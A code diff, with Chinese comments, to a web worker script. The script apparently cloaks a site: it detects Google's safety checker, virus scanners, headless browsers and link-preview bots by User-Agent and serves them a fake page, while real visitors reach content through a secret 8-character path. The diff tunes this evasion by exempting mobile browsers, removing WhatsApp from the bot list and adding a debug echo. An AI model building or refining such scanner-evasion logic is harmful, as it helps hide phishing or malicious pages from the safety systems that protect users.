@@ -12,8 +12,15 @@ async function handleRequest(request) {
   const userAgent = request.headers.get('user-agent') || ''
   const referer = request.headers.get('referer') || ''
   
-  // 检测安全扫描器和爬虫的特征
-  if (isSecurityScanner(userAgent)) {
+  // 添加调试模式：在URL中加入 ?debug=1 可查看User-Agent
+  if (url.searchParams.get('debug') === '1') {
+    return new Response(`Debug Info:\n\nUser-Agent: ${userAgent}\n\nPath: ${path}\nPath Length: ${path.length}`, {
+      headers: { 'Content-Type': 'text/plain; charset=UTF-8' }
+    })
+  }
+  
+  // 检测安全扫描器和爬虫的特征（跳过正常移动浏览器）
+  if (isSecurityScanner(userAgent) && !isMobileBrowser(userAgent)) {
     return generateFakePage()
   }
   
@@ -60,13 +67,10 @@ async function handleRequest(request) {
 
   // 如果路径不是恰好8个字符，返回403
   if (path.length !== 8) {
-    // 调试模式：显示详细错误信息（生产环境可删除此部分）
-    const debugInfo = `Access Denied\n\nDebug Info:\nPath: "${path}"\nLength: ${path.length}\nExpected: 8\n\nTip: URL should be like https://your-domain.com/12345678`;
-    
-    return new Response(debugInfo, {
+    return new Response('Access Denied', {
       status: 403,
       headers: {
-        'Content-Type': 'text/plain; charset=UTF-8'
+        'Content-Type': 'text/plain'
       }
     })
   }
@@ -87,13 +91,24 @@ async function handleRequest(request) {
   })
 }
 
+// 检测是否为正常的手机浏览器
+function isMobileBrowser(userAgent) {
+  const mobileBrowsers = [
+    'iPhone', 'iPad', 'iPod', 'Android', 'Mobile', 'BlackBerry', 
+    'Opera Mini', 'IEMobile', 'Windows Phone', 'Safari', 'Chrome'
+  ]
+  
+  const lowerUA = userAgent.toLowerCase()
+  return mobileBrowsers.some(pattern => lowerUA.includes(pattern.toLowerCase()))
+}
+
 // 检测安全扫描器和爬虫
 function isSecurityScanner(userAgent) {
   const scannerPatterns = [
     'googlebot', 'bingbot', 'yandex', 'baiduspider', 'facebookexternalhit',
     'twitterbot', 'rogerbot', 'linkedinbot', 'embedly', 'quora link preview',
     'showyoubot', 'outbrain', 'pinterest', 'slackbot', 'vkShare', 'W3C_Validator',
-    'bingpreview', 'bitlybot', 'whatsapp', 'TelegramBot', 'Google-Safety', 'Googlebot',
+    'bingpreview', 'bitlybot', 'TelegramBot', 'Google-Safety', 'Googlebot',
     'AdsBot-Google', 'chrome-lighthouse', 'HeadlessChrome', 'CheckMarkNetwork',
     'Xenu Link Sleuth', 'SecurityScanner', 'Virus', 'MSIE 6.0', 'Scrapy', 'PhantomJS'
   ]
